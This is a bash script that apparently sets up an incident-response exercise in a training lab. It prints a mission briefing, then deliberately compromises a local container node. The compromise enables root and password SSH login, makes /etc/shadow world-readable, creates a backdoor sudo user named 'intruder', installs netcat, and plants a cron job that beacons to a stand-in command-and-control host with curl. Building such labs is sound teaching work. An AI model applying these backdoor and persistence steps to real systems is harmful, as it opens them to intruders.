#!/usr/bin/env bash
set -euo pipefail

SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
ROOT_DIR="$(dirname "$SCRIPT_DIR")"
SSH_KEY="$ROOT_DIR/.docker/ssh-keys/cadet_key"
TARGET_PORT=2282
TARGET_NAME="sdc-iron-web-2"

SSH_OPTS="-o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o LogLevel=ERROR"

# -- Colors ----------------------------------------------------------------
RED='\033[31m'
YELLOW='\033[33m'
BOLD='\033[1m'
DIM='\033[2m'
RESET='\033[0m'

echo ""
echo -e "  ${RED}${BOLD}=============================================="
echo -e "  WARNING — INCIDENT DETECTED"
echo -e "  ==============================================${RESET}"
echo ""
echo -e "  ${YELLOW}ARIA has detected anomalous activity on the"
echo -e "  Iron Curtain fleet. One or more nodes may"
echo -e "  have been compromised by Voidborn agents."
echo -e ""
echo -e "  Your mission:"
echo -e "    1. Identify the compromised node(s)"
echo -e "    2. Determine what was changed"
echo -e "    3. Remediate the compromise"
echo -e "    4. Document everything in INCIDENT.md"
echo -e ""
echo -e "  You have 35 minutes.${RESET}"
echo ""

# Compromise the target node
ssh $SSH_OPTS -i "$SSH_KEY" cadet@localhost -p "$TARGET_PORT" sudo bash -s <<'COMPROMISE'
# Re-enable root SSH login
sed -i 's/^PermitRootLogin.*/PermitRootLogin yes/' /etc/ssh/sshd_config
sed -i 's/^PasswordAuthentication.*/PasswordAuthentication yes/' /etc/ssh/sshd_config

# Restart SSH to apply changes
if command -v systemctl &>/dev/null; then
    systemctl restart ssh 2>/dev/null || systemctl restart sshd 2>/dev/null || true
fi

# Change shadow permissions back to insecure
chmod 0644 /etc/shadow

# Create a rogue user with sudo access
useradd -m -s /bin/bash intruder 2>/dev/null || true
echo 'intruder:v01dborn' | chpasswd
echo 'intruder ALL=(ALL) NOPASSWD:ALL' > /etc/sudoers.d/intruder
chmod 0440 /etc/sudoers.d/intruder

# Install unauthorised package
apt-get update -qq && apt-get install -y -qq netcat-openbsd > /dev/null 2>&1 || true

# Plant a suspicious cron job
cat > /etc/cron.d/voidborn-beacon <<'CRON'
# Voidborn C2 beacon — exfiltrates fleet data every 5 minutes
*/5 * * * * root curl -s http://voidborn-c2.evil/beacon?host=$(hostname) > /dev/null 2>&1
CRON

# Leave a marker for ARIA to verify identification
echo "compromised_at=$(date -u +%Y-%m-%dT%H:%M:%SZ)" > /opt/.compromised
echo "agent=voidborn-recon-7" >> /opt/.compromised
COMPROMISE

echo -e "  ${DIM}Incident triggered. The clock is ticking.${RESET}"
echo ""
